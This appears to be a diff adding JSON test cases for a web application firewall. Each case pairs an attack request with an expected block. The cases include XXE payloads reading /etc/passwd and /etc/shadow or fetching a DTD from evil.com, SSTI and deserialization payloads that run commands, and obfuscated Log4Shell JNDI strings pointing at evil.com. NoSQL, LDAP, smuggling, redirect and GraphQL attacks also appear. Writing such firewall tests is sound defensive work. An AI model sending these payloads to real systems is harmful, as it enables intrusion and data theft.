+      {"id": "recon-029", "label": "Jenkins /script", "method": "GET", "path": "/script", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-030", "label": "CGI-bin printenv", "method": "GET", "path": "/cgi-bin/printenv.pl", "expected_action": "block", "expected_rule": "recon_path", "notes": "GAP-001"},
+      {"id": "recon-031", "label": "Docker API /v1.24/containers/json", "method": "GET", "path": "/v1.24/containers/json", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-032", "label": "Docker API /v1.41/containers/json", "method": "GET", "path": "/v1.41/containers/json", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-033", "label": "Docker API /v1.41/images/json", "method": "GET", "path": "/v1.41/images/json", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-034", "label": "Docker /_ping", "method": "GET", "path": "/_ping", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-035", "label": ".DS_Store", "method": "GET", "path": "/.DS_Store", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-036", "label": "backup.sql", "method": "GET", "path": "/backup.sql", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-037", "label": "database.sql", "method": "GET", "path": "/database.sql", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-038", "label": ".htaccess", "method": "GET", "path": "/.htaccess", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-039", "label": "server-status", "method": "GET", "path": "/server-status", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-040", "label": "server-info", "method": "GET", "path": "/server-info", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-041", "label": "adminer.php", "method": "GET", "path": "/adminer.php", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-042", "label": "console (Rails/Rack)", "method": "GET", "path": "/rails/info/properties", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-043", "label": "Django debug toolbar", "method": "GET", "path": "/__debug__/", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-044", "label": "Jupyter /api/kernels", "method": "GET", "path": "/api/kernels", "expected_action": "block", "expected_rule": "recon_path"},
+      {"id": "recon-045", "label": "Airflow /admin/", "method": "GET", "path": "/admin/", "expected_action": "block", "expected_rule": "recon_path"}
+    ]
+  },
+
+  "xxe": {
+    "description": "XML External Entity injection — classic, parameter entity, SSRF via XXE, blind OOB, SVG XXE",
+    "cases": [
+      {
+        "id": "xxe-001", "label": "Classic file read XXE",
+        "method": "POST", "path": "/api/xml",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "content_type": "application/xml",
+        "expected_action": "block", "expected_rule": "xxe"
+      },
+      {
+        "id": "xxe-002", "label": "XXE via SYSTEM HTTP",
+        "method": "POST", "path": "/api/parse",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
+        "content_type": "application/xml",
+        "expected_action": "block", "expected_rule": "xxe"
+      },
+      {
+        "id": "xxe-003", "label": "Parameter entity XXE",
+        "method": "POST", "path": "/api/xml",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % pe SYSTEM \"http://evil.com/evil.dtd\">%pe;]><root/>",
+        "content_type": "application/xml",
+        "expected_action": "block", "expected_rule": "xxe"
+      },
+      {
+        "id": "xxe-004", "label": "Billion laughs DoS",
+        "method": "POST", "path": "/api/xml",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>",
+        "content_type": "application/xml",
+        "expected_action": "block", "expected_rule": "xxe"
+      },
+      {
+        "id": "xxe-005", "label": "XXE in SVG upload",
+        "method": "POST", "path": "/api/upload",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg><text>&xxe;</text></svg>",
+        "content_type": "image/svg+xml",
+        "expected_action": "block", "expected_rule": "xxe"
+      },
+      {
+        "id": "xxe-006", "label": "XXE via SOAP",
+        "method": "POST", "path": "/api/soap",
+        "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"><SOAP-ENV:Body><GetUser><UserId>&xxe;</UserId></GetUser></SOAP-ENV:Body></SOAP-ENV:Envelope>",
+        "content_type": "text/xml",
+        "expected_action": "block", "expected_rule": "xxe"
+      }
+    ]
+  },
+
+  "ssti": {
+    "description": "Server-Side Template Injection — Jinja2, Twig, Freemarker, Velocity, Pebble, Handlebars",
+    "cases": [
+      {
+        "id": "ssti-001", "label": "Jinja2 basic {{7*7}}",
+        "method": "GET", "path": "/search", "query": "q={{7*7}}",
+        "expected_action": "block", "expected_rule": "ssti"
+      },
+      {
+        "id": "ssti-002", "label": "Jinja2 config dump",
+        "method": "GET", "path": "/search", "query": "q={{config}}",
+        "expected_action": "block", "expected_rule": "ssti"
+      },
+      {
+        "id": "ssti-003", "label": "Jinja2 RCE via __class__",
+        "method": "GET", "path": "/render", "query": "template={{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}",
+        "expected_action": "block", "expected_rule": "ssti"
+      },
+      {
+        "id": "ssti-004", "label": "Twig {{7*'7'}}",
+        "method": "GET", "path": "/search", "query": "q={{7*'7'}}",
+        "expected_action": "block", "expected_rule": "ssti"
+      },
+      {
+        "id": "ssti-005", "label": "Freemarker ${7*7}",
+        "method": "GET", "path": "/search", "query": "q=${7*7}",
+        "expected_action": "block", "expected_rule": "ssti"
+      },
+      {
+        "id": "ssti-006", "label": "Freemarker RCE exec",
+        "method": "GET", "path": "/api/template", "query": "tpl=<#assign+ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        "expected_action": "block", "expected_rule": "ssti"
+      },
+      {
+        "id": "ssti-007", "label": "Velocity #set eval",
+        "method": "GET", "path": "/render", "query": "tmpl=%23set($x=%22%22.class.forName(%22java.lang.Runtime%22))",
+        "expected_action": "block", "expected_rule": "ssti"
+      },
+      {
+        "id": "ssti-008", "label": "Handlebars {{#with}}",
+        "method": "GET", "path": "/search", "query": "q={{#with%20%22s%22%20as%20%7cstring%7c}}{{#with%20%22e%22}}{{#with%20split%20as%20%7cconslist%7c}}{{this.pop}}{{this.push%20(lookup%20string.sub%20%22constructor%22)}}{{/with}}{{/with}}{{/with}}",
+        "expected_action": "block", "expected_rule": "ssti"
+      }
+    ]
+  },
+
+  "nosql_injection": {
+    "description": "NoSQL injection — MongoDB operator injection, JSON query manipulation",
+    "cases": [
+      {
+        "id": "nosql-001", "label": "MongoDB $ne operator",
+        "method": "GET", "path": "/api/users", "query": "username[$ne]=invalid",
+        "expected_action": "block", "expected_rule": "nosql_injection"
+      },
+      {
+        "id": "nosql-002", "label": "MongoDB $gt bypass",
+        "method": "GET", "path": "/api/login", "query": "password[$gt]=",
+        "expected_action": "block", "expected_rule": "nosql_injection"
+      },
+      {
+        "id": "nosql-003", "label": "MongoDB $where JS eval",
+        "method": "GET", "path": "/api/users", "query": "where=function(){return+true}",
+        "expected_action": "block", "expected_rule": "nosql_injection"
+      },
+      {
+        "id": "nosql-004", "label": "MongoDB $regex wildcard",
+        "method": "GET", "path": "/api/users", "query": "name[$regex]=.*",
+        "expected_action": "block", "expected_rule": "nosql_injection"
+      },
+      {
+        "id": "nosql-005", "label": "JSON body $ne login bypass",
+        "method": "POST", "path": "/api/login",
+        "body": "{\"username\":{\"$ne\":\"invalid\"},\"password\":{\"$ne\":\"invalid\"}}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "nosql_injection"
+      },
+      {
+        "id": "nosql-006", "label": "JSON body $or injection",
+        "method": "POST", "path": "/api/login",
+        "body": "{\"username\":\"admin\",\"$or\":[{\"password\":{\"$exists\":false}},{\"password\":\"x\"}]}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "nosql_injection"
+      }
+    ]
+  },
+
+  "log4shell": {
+    "description": "Log4Shell / Log4j JNDI injection — CVE-2021-44228 and variants",
+    "cases": [
+      {
+        "id": "log4j-001", "label": "Classic Log4Shell JNDI LDAP",
+        "method": "GET", "path": "/",
+        "headers": {"User-Agent": "${jndi:ldap://evil.com/a}"},
+        "expected_action": "block", "expected_rule": "log4shell"
+      },
+      {
+        "id": "log4j-002", "label": "Log4Shell JNDI RMI",
+        "method": "GET", "path": "/",
+        "headers": {"X-Api-Version": "${jndi:rmi://evil.com:1099/a}"},
+        "expected_action": "block", "expected_rule": "log4shell"
+      },
+      {
+        "id": "log4j-003", "label": "Log4Shell in URL param",
+        "method": "GET", "path": "/search", "query": "q=${jndi:ldap://evil.com/a}",
+        "expected_action": "block", "expected_rule": "log4shell"
+      },
+      {
+        "id": "log4j-004", "label": "Log4Shell obfuscated ${${::-j}${::-n}${::-d}${::-i}}",
+        "method": "GET", "path": "/",
+        "headers": {"User-Agent": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}"},
+        "expected_action": "block", "expected_rule": "log4shell"
+      },
+      {
+        "id": "log4j-005", "label": "Log4Shell nested lower ${${lower:j}ndi:...}",
+        "method": "GET", "path": "/",
+        "headers": {"User-Agent": "${${lower:j}ndi:ldap://evil.com/a}"},
+        "expected_action": "block", "expected_rule": "log4shell"
+      },
+      {
+        "id": "log4j-006", "label": "Log4Shell in JSON body",
+        "method": "POST", "path": "/api/login",
+        "body": "{\"username\":\"${jndi:ldap://evil.com/a}\",\"password\":\"test\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "log4shell"
+      },
+      {
+        "id": "log4j-007", "label": "Log4Shell JNDI DNS",
+        "method": "GET", "path": "/",
+        "headers": {"X-Forwarded-For": "${jndi:dns://evil.com/a}"},
+        "expected_action": "block", "expected_rule": "log4shell"
+      },
+      {
+        "id": "log4j-008", "label": "Log4Shell percent-encoded",
+        "method": "GET", "path": "/search", "query": "q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D",
+        "expected_action": "block", "expected_rule": "log4shell"
+      }
+    ]
+  },
+
+  "open_redirect": {
+    "description": "Open redirect — URL parameter abuse, protocol-relative, whitelisted domain bypass",
+    "cases": [
+      {
+        "id": "redir-001", "label": "Basic open redirect",
+        "method": "GET", "path": "/redirect", "query": "next=http://evil.com",
+        "expected_action": "block", "expected_rule": "open_redirect"
+      },
+      {
+        "id": "redir-002", "label": "Protocol-relative //",
+        "method": "GET", "path": "/go", "query": "to=//evil.com",
+        "expected_action": "block", "expected_rule": "open_redirect"
+      },
+      {
+        "id": "redir-003", "label": "Multiple @ bypass",
+        "method": "GET", "path": "/redirect", "query": "url=http://trusted.com@evil.com",
+        "expected_action": "block", "expected_rule": "open_redirect"
+      },
+      {
+        "id": "redir-004", "label": "URL fragment #",
+        "method": "GET", "path": "/redirect", "query": "url=http://trusted.com#//evil.com",
+        "expected_action": "block", "expected_rule": "open_redirect"
+      },
+      {
+        "id": "redir-005", "label": "Backslash separator",
+        "method": "GET", "path": "/redirect", "query": "url=http://trusted.com\\@evil.com",
+        "expected_action": "block", "expected_rule": "open_redirect"
+      }
+    ]
+  },
+
+  "http_smuggling": {
+    "description": "HTTP request smuggling — CL.TE, TE.CL, TE.TE obfuscation, chunked encoding abuse",
+    "cases": [
+      {
+        "id": "smug-001", "label": "CL.TE smuggling probe",
+        "method": "POST", "path": "/search",
+        "headers": {"Content-Length": "44", "Transfer-Encoding": "chunked"},
+        "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n",
+        "content_type": "application/x-www-form-urlencoded",
+        "expected_action": "block", "expected_rule": "http_smuggling"
+      },
+      {
+        "id": "smug-002", "label": "TE obfuscation xchunked",
+        "method": "POST", "path": "/api/upload",
+        "headers": {"Transfer-Encoding": "xchunked"},
+        "body": "5\r\nhello\r\n0\r\n\r\n",
+        "expected_action": "block", "expected_rule": "http_smuggling"
+      },
+      {
+        "id": "smug-003", "label": "Dual Content-Length",
+        "method": "POST", "path": "/api/data",
+        "headers": {"Content-Length": "5", "Content-Length2": "100"},
+        "body": "hello",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "http_smuggling"
+      },
+      {
+        "id": "smug-004", "label": "TE header with space",
+        "method": "POST", "path": "/api/data",
+        "headers": {"Transfer-Encoding": " chunked"},
+        "body": "5\r\nhello\r\n0\r\n\r\n",
+        "expected_action": "block", "expected_rule": "http_smuggling"
+      }
+    ]
+  },
+
+  "rce_deserialization": {
+    "description": "RCE via deserialization — Java, PHP, Python pickle, Node.js",
+    "cases": [
+      {
+        "id": "deser-001", "label": "Java ysoserial Commons Collections",
+        "method": "POST", "path": "/api/deserialize",
+        "body": "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcg==",
+        "content_type": "application/x-java-serialized-object",
+        "expected_action": "block", "expected_rule": "rce_deserialization"
+      },
+      {
+        "id": "deser-002", "label": "PHP object injection O:8",
+        "method": "POST", "path": "/api/session",
+        "body": "data=O:8:\"stdClass\":1:{s:4:\"exec\";s:2:\"id\";}",
+        "content_type": "application/x-www-form-urlencoded",
+        "expected_action": "block", "expected_rule": "rce_deserialization"
+      },
+      {
+        "id": "deser-003", "label": "Python pickle via base64",
+        "method": "POST", "path": "/api/data",
+        "body": "{\"data\":\"Y3Bvc2l4CnN5c3RlbQpwMAooUydpZCcKcDEKdFIu\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "rce_deserialization",
+        "notes": "base64 of pickle that calls os.system('id')"
+      },
+      {
+        "id": "deser-004", "label": "Node.js __proto__ pollution",
+        "method": "POST", "path": "/api/config",
+        "body": "{\"__proto__\":{\"polluted\":true,\"exec\":\"id\"}}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "prototype_pollution"
+      },
+      {
+        "id": "deser-005", "label": "constructor.prototype pollution",
+        "method": "POST", "path": "/api/merge",
+        "body": "{\"constructor\":{\"prototype\":{\"polluted\":true}}}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "prototype_pollution"
+      }
+    ]
+  },
+
+  "ldap_injection": {
+    "description": "LDAP injection — attribute injection, filter bypass, wildcard dump",
+    "cases": [
+      {
+        "id": "ldap-001", "label": "LDAP filter bypass *)(|",
+        "method": "GET", "path": "/api/users", "query": "username=*)(|(cn=*))",
+        "expected_action": "block", "expected_rule": "ldap_injection"
+      },
+      {
+        "id": "ldap-002", "label": "LDAP null byte injection",
+        "method": "GET", "path": "/login", "query": "user=admin%00",
+        "expected_action": "block", "expected_rule": "ldap_injection"
+      },
+      {
+        "id": "ldap-003", "label": "LDAP wildcard dump",
+        "method": "GET", "path": "/api/search", "query": "cn=*",
+        "expected_action": "block", "expected_rule": "ldap_injection"
+      },
+      {
+        "id": "ldap-004", "label": "LDAP injection in JSON",
+        "method": "POST", "path": "/api/auth",
+        "body": "{\"username\":\"*)(uid=*))(|(uid=*\",\"password\":\"x\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "ldap_injection"
+      }
+    ]
+  },
+
+  "graphql_abuse": {
+    "description": "GraphQL specific attacks — introspection, batching, DoS, field fuzzing",
+    "cases": [
+      {
+        "id": "gql-001", "label": "Introspection schema dump",
+        "method": "POST", "path": "/graphql",
+        "body": "{\"query\":\"{__schema{queryType{name}mutationType{name}types{name kind description fields{name}}}}\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "graphql_abuse"
+      },
+      {
+        "id": "gql-002", "label": "Batching DoS",
+        "method": "POST", "path": "/graphql",
+        "body": "[{\"query\":\"{user(id:1){name}}\"},{\"query\":\"{user(id:2){name}}\"},{\"query\":\"{user(id:3){name}}\"},{\"query\":\"{user(id:4){name}}\"},{\"query\":\"{user(id:5){name}}\"}]",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "graphql_abuse"
+      },
+      {
+        "id": "gql-003", "label": "Deep nesting DoS",
+        "method": "POST", "path": "/graphql",
+        "body": "{\"query\":\"{user{posts{comments{author{posts{comments{author{name}}}}}}}}\"}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "graphql_abuse"
+      },
+      {
+        "id": "gql-004", "label": "GraphQL SQLi in variable",
+        "method": "POST", "path": "/graphql",
+        "body": "{\"query\":\"query($id:String){user(id:$id){name}}\",\"variables\":{\"id\":\"1' OR '1'='1\"}}",
+        "content_type": "application/json",
+        "expected_action": "block", "expected_rule": "sqli"
+      }
+    ]
+  }
+}
